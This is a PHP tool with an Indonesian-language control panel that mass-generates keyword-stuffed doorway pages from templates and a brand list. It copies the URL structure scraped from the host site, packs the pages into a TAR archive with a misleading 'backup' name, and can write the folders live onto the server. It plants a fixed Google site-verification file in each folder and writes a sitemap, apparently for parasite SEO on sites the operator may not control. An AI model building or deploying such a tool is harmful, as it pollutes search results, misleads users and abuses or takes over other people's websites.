<?php
/**
 * SCRIPT FINAL V18: MULTI-PURPOSE TAR GENERATOR (ULTRA-COMPATIBLE)
 * - 100% Bebas dari Error ZipArchive karena menggunakan format .tar (PharData).
 * - Menghasilkan 1 berkas kompresi (.tar) tunggal di server yang membundel semua file virtual.
 * - Memiliki opsi tombol untuk mengekstrak folder fisik secara nyata ke hosting atau tidak.
 * - Menggunakan Regex murni yang sangat ringan dan aman dari crash.
 */

@ini_set('display_errors', 1);
@ini_set('display_startup_errors', 1);
@error_reporting(E_ALL);

@set_time_limit(600);
@ini_set('memory_limit', '512M');

$dirFile         = 'dir.txt';
$listFile        = 'list.txt';
$templateFile    = 'template.php';
$templateAmpFile = 'template-amp.php';

// Pengaturan Google Verification
$googleFileName = 'google2b748e987f49b9ff.html';
$googleContent  = 'google-site-verification: google2b748e987f49b9ff.html';

$host = $_SERVER['HTTP_HOST'];
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
$baseUrl = $protocol . $host;

$extractFisik = (isset($_POST['extract_physical']) && $_POST['extract_physical'] == '1');
$isProcessed  = (isset($_POST['submit_proses']));

function dapatkanDaftarDirektori($url, $dirFile) {
    $cleanDirs = [];
    $blacklist = ['wp-admin', 'wp-content', 'wp-includes', 'category', 'tag', 'author', 'search', 'home', 'login', 'register'];

    if (file_exists($dirFile)) {
        $rawLines = file($dirFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($rawLines as $line) {
            $href = trim(preg_replace('/[\x00-\x1F\x7F-\x9F\xA0]/u', '', $line));
            if (empty($href)) continue;

            $parsedUrl = parse_url($href);
            $path = isset($parsedUrl['path']) ? trim($parsedUrl['path'], '/') : $href;
            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';

            $slug = '';
            if (!empty($path)) {
                $fileInfo = pathinfo($path);
                if (isset($fileInfo['extension']) && in_array(strtolower($fileInfo['extension']), ['php', 'html', 'htm'])) {
                    $dirPrefix = ($fileInfo['dirname'] !== '.' && !empty($fileInfo['dirname'])) ? $fileInfo['dirname'] . '/' : '';
                    $slug = $dirPrefix . $fileInfo['filename'];
                } else {
                    $slug = $path;
                }
            }

            if (empty($slug) && !empty($query)) {
                parse_str($query, $queryParams);
                if (isset($queryParams['']) && !empty($queryParams[''])) {
                    $slug = $queryParams[''];
                } elseif (!empty($queryParams)) {
                    $firstValue = reset($queryParams);
                    if (!empty($firstValue) && is_string($firstValue)) {
                        $slug = $firstValue;
                    }
                }
            }

            $slug = trim($slug, '/');
            if (empty($slug)) continue;

            $segments = explode('/', $slug);
            $isBlacklisted = false;
            foreach ($segments as $segment) {
                if (in_array(strtolower($segment), $blacklist) || strpos($segment, '.') !== false) {
                    $isBlacklisted = true;
                    break;
                }
            }
            if ($isBlacklisted) continue;

            if (preg_match('/^[a-zA-Z0-9_\-\/]+$/', $slug)) {
                $cleanDirs[] = strtolower($slug);
            }
        }
        return array_unique($cleanDirs);
    }

    // Fallback Scrape via Regex jika dir.txt kosong
    $options = ["http" => ["header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"]];
    $context = stream_context_create($options);
    $html = @file_get_contents($url, false, $context);
    if ($html) {
        preg_match_all('/href=["\']([^"\']+)["\']/i', $html, $matches);
        if (!empty($matches[1])) {
            foreach ($matches[1] as $href) {
                $href = trim($href);
                if (empty($href) || $href === '#' || strpos($href, 'javascript:') === 0) continue;
                $parsedUrl = parse_url($href);
                $path = isset($parsedUrl['path']) ? trim($parsedUrl['path'], '/') : '';
                if (empty($path)) continue;
                $fileInfo = pathinfo($path);
                $slug = (isset($fileInfo['extension']) && in_array(strtolower($fileInfo['extension']), ['php', 'html', 'htm'])) ? (($fileInfo['dirname'] !== '.' && !empty($fileInfo['dirname'])) ? $fileInfo['dirname'] . '/' : '') . $fileInfo['filename'] : $path;
                $slug = trim($slug, '/');
                if (preg_match('/^[a-zA-Z0-9_\-\/]+$/', $slug)) { $cleanDirs[] = strtolower($slug); }
            }
        }
    }
    return (!empty($cleanDirs)) ? array_unique($cleanDirs) : ['main'];
}

// ==========================================
// TAMPILAN INTERFACE PANEL UTAMA
// ==========================================
echo "<div style='font-family:sans-serif; padding:20px; max-width:900px; margin:auto; background:#f4f6f9; border-radius:8px; border:1px solid #ddd; margin-bottom:20px;'>";
echo "<h2>🛠️ Panel Kendali Sinkronisasi Berkas TAR (v18)</h2>";
echo "<p><b>Mode Kompresi:</b> <span style='color:blue;font-weight:bold;'>Format Kontainer .TAR (Aman 100% Tanpa Modul Zip)</span></p>";
echo "<p><b>Sumber Data:</b> " . (file_exists($dirFile) ? "<span style='color:green;font-weight:bold;'>Terdeteksi file dir.txt (".count(file($dirFile))." baris)</span>" : "<span style='color:orange;font-weight:bold;'>Mode Scrape Otomatis Beranda</span>") . "</p>";

echo "<form method='POST' action=''>";
echo "<div style='margin-bottom:15px; padding:10px; background:#fff; border-left:4px solid #28a745;'>";
echo "<label style='font-weight:bold; cursor:pointer;'>";
echo "<input type='checkbox' name='extract_physical' value='1' " . ($extractFisik ? "checked" : "") . "> ";
echo "Centang jika ingin sekalian membuat Folder FISIK Nyata di Hosting lokal ini.";
echo "</label>";
echo "</div>";
echo "<button type='submit' name='submit_proses' value='1' style='background:#28a745; color:#fff; padding:14px 20px; border:none; border-radius:5px; font-weight:bold; cursor:pointer; width:100%; font-size:16px;'>🚀 MULAI PROSES SINKRONISASI & BUAT ARSIP TAR</button>";
echo "</form>";
echo "</div>";

// ==========================================
// PROSES EKSEKUSI DATA SETELAH KLIK TOMBOL
// ==========================================
if ($isProcessed) {

    if (!file_exists($listFile) || !file_exists($templateFile) || !file_exists($templateAmpFile)) {
        die("<div style='color:red; font-family:sans-serif; padding:20px; max-width:900px; margin:auto;'><b>Gagal:</b> Berkas list.txt, template.php, atau template-amp.php tidak lengkap.</div>");
    }

    $targetDirs  = dapatkanDaftarDirektori($baseUrl, $dirFile);
    $brands      = file($listFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $template    = file_get_contents($templateFile);
    $templateAmp = file_get_contents($templateAmpFile);

    // Menentukan nama file arsip kompresi TAR tunggal
    $tarNameAsli = "backup_production_package.tar";

    // Hapus berkas lama jika sudah ada
    if (file_exists($tarNameAsli)) @unlink($tarNameAsli);

    try {
        // Inisialisasi Kontainer TAR Menggunakan PharData bawaan PHP inti
        $tarAsli = new PharData($tarNameAsli);
        
        $createdFolders = [];
        $summaryData = [];

        foreach ($targetDirs as $key => $dirPath) {
            $dirPath = trim($dirPath, " /");
            if (empty($dirPath)) continue;
            
            $brandName = isset($brands[$key]) ? trim($brands[$key]) : $brands[$key % count($brands)];
            $brandName = preg_replace('/[\x00-\x1F\x7F-\x9F\xA0]/u', '', $brandName);

            // 1. Masukkan data Konten Asli ke dalam file .TAR secara virtual
            $finalContent = str_replace(['{{judul}}', '{{dir}}'], [htmlspecialchars($brandName), $dirPath], $template);
            $tarAsli->addFromString("$dirPath/index.html", $finalContent);
            $tarAsli->addFromString("$dirPath/$googleFileName", $googleContent);

            // 2. Masukkan Konten AMP ke folder terpisah (amp-version/) di dalam TAR yang sama
            $finalContentAmp = str_replace(['{{judul}}', '{{dir}}'], [htmlspecialchars($brandName), $dirPath], $templateAmp);
            $tarAsli->addFromString("amp-version/$dirPath/index.html", $finalContentAmp);

            // 3. Jika Opsi Ekstrak Fisik ke Hosting Di-centang
            if ($extractFisik) {
                if (!is_dir($dirPath)) {
                    mkdir($dirPath, 0755, true);
                }
                file_put_contents("$dirPath/index.html", $finalContent);
                file_put_contents("$dirPath/$googleFileName", $googleContent);
            }

            $createdFolders[] = $dirPath;
            $summaryData[] = [
                'url' => "$baseUrl/$dirPath/",
                'kw'  => $brandName
            ];
        }

        // 4. Membuat & Memasukkan Sitemap.xml ke dalam kontainer TAR
        if (!empty($createdFolders)) {
            $sitemapContent = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
            $sitemapContent .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
            foreach ($createdFolders as $folder) {
                $sitemapContent .= '  <url>' . PHP_EOL;
                $sitemapContent .= '    <loc>' . $baseUrl . '/' . $folder . '/</loc>' . PHP_EOL;
                $sitemapContent .= '    <lastmod>' . date('Y-m-d') . '</lastmod>' . PHP_EOL;
                $sitemapContent .= '    <changefreq>daily</changefreq>' . PHP_EOL;
                $sitemapContent .= '    <priority>0.8</priority>' . PHP_EOL;
                $sitemapContent .= '  </url>' . PHP_EOL;
            }
            $sitemapContent .= '</urlset>';

            file_put_contents("sitemap.xml", $sitemapContent);
            $tarAsli->addFromString("sitemap.xml", $sitemapContent);
        }

        // ==========================================
        // NOTIFIKASI LAPORAN SUKSES
        // ==========================================
        echo "<div style='font-family:sans-serif; padding:20px; max-width:900px; margin:auto; border:2px solid #28a745; border-radius:5px; background:#fff; margin-top:20px;'>";
        echo "<h2 style='color:#28a745; margin-top:0;'>✅ Berkas Kontainer TAR Berhasil Dibuat!</h2>";
        echo "<p><b>Total Sukses Ekstraksi:</b> " . count($createdFolders) . " Jalur Rute Halaman</p>";
        echo "<p><b>Status Penyimpanan Hosting:</b> " . ($extractFisik ? "<span style='color:green;font-weight:bold;'>Folder fisik sukses diterbitkan</span>" : "<span style='color:blue;'>Hemat memori (Hanya dibundel di file TAR)</span>") . "</p>";
        echo "<p style='margin-bottom: 25px; margin-top: 15px;'>";
        echo "<a href='$tarNameAsli' style='background:#007bff; color:white; padding:12px 20px; text-decoration:none; border-radius:5px; font-weight:bold; display:inline-block;'>📥 DOWNLOAD FILE ALL-IN-ONE TAR</a>";
        echo "</p>";
        echo "<small style='color:#666;'>*Catatan: Di dalam file TAR ini, versi Konten Asli berada di root folder, dan versi Konten AMP terkumpul rapi di dalam subfolder bernama <b>amp-version/</b></small>";

        echo "<h3 style='margin-top:20px;'>📋 Salin Daftar URL:</h3>";
        echo "<textarea style='width:100%; height:130px; padding:10px; font-family:monospace;'>";
        foreach($summaryData as $item) { echo $item['url'] . "\n"; }
        echo "</textarea>";

        echo "<h3>📋 Salin Daftar Keyword:</h3>";
        echo "<textarea style='width:100%; height:130px; padding:10px; font-family:monospace;'>";
        foreach($summaryData as $item) { echo $item['kw'] . "\n"; }
        echo "</textarea>";
        echo "</div>";

    } catch (Exception $e) {
        die("<div style='color:red; font-family:sans-serif; padding:20px; max-width:900px; margin:auto;'><b>Error Kompresi:</b> " . $e->getMessage() . "</div>");
    }
}
?>
